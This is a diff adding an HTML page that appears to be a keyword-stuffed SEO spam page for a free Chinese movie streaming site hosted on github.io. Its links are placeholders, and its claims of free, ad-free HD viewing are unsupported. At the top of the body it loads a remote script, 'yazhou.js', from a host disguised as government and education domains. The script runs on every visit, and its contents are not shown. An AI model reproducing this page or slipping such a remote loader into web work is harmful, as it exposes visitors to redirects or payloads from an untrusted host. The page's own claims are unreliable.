@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>717电影网在线观看 - 高清影视免费看</title>
+    <meta name="description" content="717电影网在线观看为您提供最新高清电影、电视剧、动漫在线观看服务，支持手机端自适应播放，尽在717dianyingwangzaixianguankan-app.github.io。">
+    <meta name="keywords" content="717电影网在线观看, 电影在线观看, 免费电影, 高清影视">
+    <meta name="author" content="717电影网在线观看">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="717电影网在线观看 - 高清影视免费看">
+    <meta property="og:description" content="717电影网在线观看为您提供最新高清电影、电视剧、动漫在线观看服务。">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://717dianyingwangzaixianguankan-app.github.io">
+    <style>
+        :root {
+            --bg-color: #0f0f1a;
+            --card-bg: rgba(25, 25, 45, 0.7);
+            --accent-1: #ff2a5f;
+            --accent-2: #4a00e0;
+            --text-primary: #e0e0e0;
+            --text-secondary: #a0a0c0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(255, 42, 95, 0.08) 0%, transparent 50%),
+                radial-gradient(circle at 85% 30%, rgba(74, 0, 224, 0.08) 0%, transparent 50%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Header */
+        header {
+            padding: 40px 0;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 2.8rem;
+            font-weight: 800;
+            background: linear-gradient(45deg, var(--accent-1), var(--accent-2));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+            letter-spacing: -1px;
+        }
+
+        .domain {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            margin-bottom: 30px;
+        }
+
+        .domain a {
+            color: var(--accent-1);
+            text-decoration: none;
+        }
+
+        /* Navigation */
+        nav {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .nav-btn {
+            padding: 12px 28px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            color: var(--text-primary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-btn:hover {
+            background: linear-gradient(45deg, var(--accent-1), var(--accent-2));
+            color: white;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255, 42, 95, 0.2);
+        }
+
+        /* Main Content Grid */
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 40px;
+        }
+
+        .section-card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .section-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--accent-1), var(--accent-2));
+        }
+
+        .section-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .section-card h2 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-card h2 .icon {
+            font-size: 1.8rem;
+        }
+
+        .section-card p {
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+        }
+
+        .section-card ul {
+            list-style: none;
+        }
+
+        .section-card ul li {
+            padding: 12px 0;
+            border-bottom: 1px dashed rgba(255, 255, 255, 0.05);
+        }
+
+        .section-card ul li:last-child {
+            border-bottom: none;
+        }
+
+        .section-card ul li a {
+            color: var(--text-primary);
+            text-decoration: none;
+            display: flex;
+            justify-content: space-between;
+            transition: color 0.3s ease;
+        }
+
+        .section-card ul li a:hover {
+            color: var(--accent-1);
+        }
+
+        .section-card ul li a span {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 40px 0 20px;
+            margin-top: 60px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        footer p {
+            margin-bottom: 10px;
+        }
+
+        footer a {
+            color: var(--accent-1);
+            text-decoration: none;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 2rem;
+            }
+            
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .section-card {
+                padding: 25px 20px;
+            }
+            
+            nav {
+                gap: 10px;
+            }
+            
+            .nav-btn {
+                padding: 10px 20px;
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo {
+                font-size: 1.8rem;
+            }
+            
+            .container {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+    <div class="container">
+        <header>
+            <h1 class="logo">717电影网在线观看</h1>
+            <p class="domain">访问网址: <a href="https://717dianyingwangzaixianguankan-app.github.io">717dianyingwangzaixianguankan-app.github.io</a></p>
+            
+            <nav>
+                <a href="#home" class="nav-btn">首页推荐</a>
+                <a href="#movies" class="nav-btn">电影频道</a>
+                <a href="#tv" class="nav-btn">电视剧集</a>
+                <a href="#about" class="nav-btn">关于我们</a>
+            </nav>
+        </header>
+
+        <main class="content-grid">
+            <!-- 栏目 1: 首页推荐 -->
+            <section id="home" class="section-card">
+                <h2><span class="icon">🏠</span> 首页推荐</h2>
+                <p>717电影网在线观看为您精选最新、最热的影视内容，每日更新，让您不错过任何一部好剧。</p>
+                <ul>
+                    <li><a href="#">热映电影 <span>🔥 火爆</span></a></li>
+                    <li><a href="#">高分推荐 <span>⭐ 9.0+</span></a></li>
+                    <li><a href="#">最新上线 <span>🆕 本周</span></a></li>
+                    <li><a href="#">经典回顾 <span>🎞️ 必看</span></a></li>
+                </ul>
+            </section>
+
+            <!-- 栏目 2: 电影频道 -->
+            <section id="movies" class="section-card">
+                <h2><span class="icon">🎬</span> 电影频道</h2>
+                <p>在717电影网在线观看，您可以找到各种类型的高清电影，支持手机端流畅播放。</p>
+                <ul>
+                    <li><a href="#">动作科幻 <span>🚀 震撼</span></a></li>
+                    <li><a href="#">喜剧爱情 <span>😂 轻松</span></a></li>
+                    <li><a href="#">悬疑惊悚 <span>🔪 烧脑</span></a></li>
+                    <li><a href="#">动漫动画 <span>🎨 治愈</span></a></li>
+                </ul>
+            </section>
+
+            <!-- 栏目 3: 电视剧集 -->
+            <section id="tv" class="section-card">
+                <h2><span class="icon">📺</span> 电视剧集</h2>
+                <p>海量电视剧资源，高清画质，717电影网在线观看让您随时随地追剧不停歇。</p>
+                <ul>
+                    <li><a href="#">内地剧集 <span>🇨🇳 热播</span></a></li>
+                    <li><a href="#">韩剧美剧 <span>🌏 同步</span></a></li>
+                    <li><a href="#">综艺节目 <span>🎤 搞笑</span></a></li>
+                    <li><a href="#">纪录片 <span>🌍 探索</span></a></li>
+                </ul>
+            </section>
+
+            <!-- 栏目 4: 关于我们 -->
+            <section id="about" class="section-card">
+                <h2><span class="icon">ℹ️</span> 关于我们</h2>
+                <p>717电影网在线观看致力于为广大影迷提供免费、高清、流畅的在线观影体验。我们的优势：</p>
+                <ul>
+                    <li><a href="#">✅ 全站免费观看</a></li>
+                    <li><a href="#">✅ 手机电脑自适应</a></li>
+                    <li><a href="#">✅ 每日更新资源</a></li>
+                    <li><a href="#">✅ 高清画质无广告</a></li>
+                </ul>
+            </section>
+        </main>
+
+        <footer>
+            <p>© 2026 717电影网在线观看. 保留所有权利.</p>
+            <p>网站网址: <a href="https://717dianyingwangzaixianguankan-app.github.io">https://717dianyingwangzaixianguankan-app.github.io</a></p>
+            <p>关键词: 717电影网在线观看 | 免费高清电影 | 手机在线观看</p>
+        </footer>
+    </div>
+
+    <script>
+        // 平滑滚动
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
+</body>
+</html>
